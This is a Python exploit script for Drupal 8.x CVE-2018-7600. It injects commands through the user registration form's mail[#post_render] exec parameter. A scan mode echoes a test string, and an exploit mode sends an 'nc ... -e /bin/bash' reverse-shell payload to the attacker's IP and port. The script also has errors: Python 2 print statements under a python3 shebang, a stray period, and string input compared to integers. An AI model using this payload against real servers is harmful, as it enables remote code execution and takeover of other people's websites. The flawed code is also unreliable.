#!/usr/bin/env python3
import sys
import requests



def test_target():
        rhost = input('what is the address of the target machine (example: https://10.10.10.10/): ')
        target_url = "%s/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"%(rhost)
        print "[*] Testing if target is vulnerable".  
        try:
                r = requests.post(target_url, headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0;; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'}, data={"form_id": "user_register_form", "_drupal_ajax": "1", "mail[#post_render][]": "exec", "mail[#type]": "markup", "mail[#markup]": "echo 'haha'"})
                if r.status_code == 200:    
                        response = r.content  
                        if "haha" in response:    
                                print "[!] The target is vulnerable"
                else:
                        print "[*] - Target not vulnerable"
        except: 
                print "[!] - Something went wrong"
def exploit_target():
   rhost = input('what is the address of the target machine (example: https://10.10.10.10/): ')
   lhost = input('what is your local ip address (example: 10.10.10.10): ')
   lport = input('what port do you want the target to listen on (example: 4444): ')
   verify = False
   revshell ="nc %s %s -e /bin/bash"%(lhost,lport) 
   url = rhost + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
   payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': revshell}

   r = requests.post(url,data=payload,verify=verify)
   check = requests.get(rhost,verify=verify)
   if check.status_code != 200: 
     sys.exit("Not exploitable")
   print("target is vulnerable")
   result = r.text
   print (result) 


print ('welcome to the automation script for the 8.x Drupal CVE-2018-7600')
a = input('press 0 for a scan and 1 to exploit')
if a == 1 :
   exploit_target()
elif a == 0 :
   test_target()
else :
   print('''the output must be 0 or 1
            bye :)
   ''')
